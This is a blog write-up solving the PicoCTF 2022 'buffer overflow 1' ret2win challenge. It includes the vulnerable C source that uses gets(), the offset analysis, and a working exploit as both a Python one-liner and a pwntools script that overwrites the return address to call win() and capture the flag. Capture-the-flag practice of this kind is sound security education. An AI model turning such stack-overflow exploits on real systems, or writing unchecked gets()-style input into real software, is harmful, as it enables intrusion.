---
layout: single
title:  "PicoCTF 2022 - buffer overflow 1"
categories: 
  - PicoCTF
  - Binary Exploitation
tags:
  - ctf
  - picoctf
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
---

This is the first "proper" binary exploitation (ret2win) challenge in this CTF.

For this challenge, I found John Hammond's [walkthrough video](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB) to be extremely helpful and informative.

## My Solution
Firstly, let's download the provided files.
```bash
wget https://artifacts.picoctf.net/c/187/vuln
wget https://artifacts.picoctf.net/c/187/vuln.c
```

Let's take a look at the `vuln` binary. Using `file` and `checksec`, we observe the following:
```bash
$ file vuln
>> vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, 
BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped

$ checksec vuln                                                                     
[*] '/mnt/c/Users/yihao/Downloads/picoCTF/2022/blog/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```
From this, we can observe that the file:
- is a 32-bit ELF file,
- is not stripped,
- is compiled on a little-endian system, and
- has very little protection in place (stack is executable, no stack canary).

Now, looking at `vuln.c`, we can note down some interesting features.
```c
...
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
We can see that the provided file has a read buffer size of 32, and has a `win()` function present. The `gets()` function is also used to retrieve user input within the `vuln()` function. Lastly, the program also prints out a return address using a `get_return_address()` function.

Evidently, we will need to control the return address to call the `win()` function. Here, the program helps us to visualize the return address by printing it to standard output. 

I then decided to do some experimenting to see how many 'A's will cause the printed return address to be overwritten. Without causing any segmentation fault, we observe that the program returned to this address: `0x804932f`.

I then used GDB to disassemble the program, in order to see which instruction this address points to.
```bash
$ gdb vuln
>> ...
gef> disas main
...
 0x0804932f <+107>:   mov    eax,0x0
...
```
It appears that this specific address is bound to a move instruction in `main()`.

Through further trial and error, I found that around 44 'A's were required to clobber the return address (which was seen from the presence of 41s in the printed address - 41 is the hex representation of A). 

I can then run `readelf -s vuln` to look for the address of `win()`. Through this, we note that the address is `0x080491f6`.

Now, we can generate the payload. In this case, we want to order our bytes for `win()` in "reverse", since the executable runs on a little-endian system.

Using Python 2.7 to pipe the payload directly into the program: 
```bash
python -c "print 'A'*44 + '\xf6\x91\x04\x08'" | nc saturn.picoctf.net 60801 
```

Alternatively, using Python 3 and pwntools to send the payload through a solver script:
```python
# solve.py

from pwn import *
# elf = ELF('./vuln') # for local execution
# p = process(elf.path) # for local execution
p = remote('saturn.picoctf.net', 60801) # for remote execution

# payload buffer
payload = b'A' * 44 # offset of 44 to EIP
payload += p32(0x080491f6) # address of win()

print(p.recvuntil(':'))
p.sendline(payload)
p.interactive()
```
Both methods allow us to obtain the flag.
```bash
[+] Opening connection to saturn.picoctf.net on port 60801: Done
solve.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(p.recvuntil(':'))
b'Please enter your string:'
[*] Switching to interactive mode

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}[*] Got EOF while reading in interactive
$
[*] Closed connection to saturn.picoctf.net port 60801
```

## Learning Takeaways
Some general tips I picked up here:
- Play around with the program to test the number of dummy characters required to clobber the return address of our intended functions. Or, how many characters do we need to determine the offset of EIP?
  - We also can use GDB/GEF to determine the offsets, but that will be covered in a later writeup. :)
- Get familiar with `readelf`.
- Python 2 can be used to generate simple payloads, but for more complex payloads and ROP chains, it may be better to use pwntools and Python 3 instead.
  - Interestingly, Python 2 lets us directly pipe in the payload into the program using a print statement, but we can't seem to do this with Python 3 (not even after converting the payload into a bytestring). It could be to do with the behaviour of the print function in Python 3, where it appends a newline character after the payload string. Consequently, this newline character modifies the payload and makes it incorrect.
- Note the differences between little-endian and big-endian.

## References
- [John Hammond (YouTube): 32-bit x86 LINUX BUFFER OVERFLOW (PicoCTF 2022 #31 'buffer-overflow1')](https://www.youtube.com/watch?v=k4hqdVo3cqk&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=31&pp=iAQB)
